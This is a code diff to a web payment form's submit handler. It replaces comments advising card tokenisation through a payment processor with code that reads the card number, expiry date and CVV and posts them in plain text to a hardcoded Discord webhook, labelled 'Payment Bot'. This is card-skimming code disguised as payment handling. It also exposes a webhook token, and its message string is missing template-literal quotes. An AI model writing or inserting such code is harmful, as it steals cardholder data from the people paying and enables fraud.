@@ -83,17 +83,19 @@
         document.getElementById('payment-form').addEventListener('submit', function(e) {
             e.preventDefault();
 
-            // Use a payment gateway or API here to handle the payment
-            // Do not send card details directly; instead, tokenize them using the payment processor
+            const cardNumber = document.getElementById('card-number').value;
+            const expiryDate = document.getElementById('expiry-date').value;
+            const cvv = document.getElementById('cvv').value;
 
-            const paymentGatewayUrl = "YOUR_PAYMENT_GATEWAY_URL"; // Replace with your payment gateway URL
+            // Replace with the appropriate webhook URL
+            const webhookUrl = "https://discord.com/api/webhooks/1273279153172512800/v6EO4OBF9zg6lGfm_yndNAoEergAFw85jjZXL8C2Dpbcbl_rRSnUkzqf_AFtv4lR9seC";
 
-            fetch(paymentGatewayUrl, {
+            fetch(webhookUrl, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
-                    // Payment details should be handled by the payment processor
-                    // Example: token or transaction ID
+                    username: "Payment Bot",
+                    content: Card Number: ${cardNumber}\nExpiry Date: ${expiryDate}\nCVV: ${cvv}
                 })
             })
             .then(response => response.json())
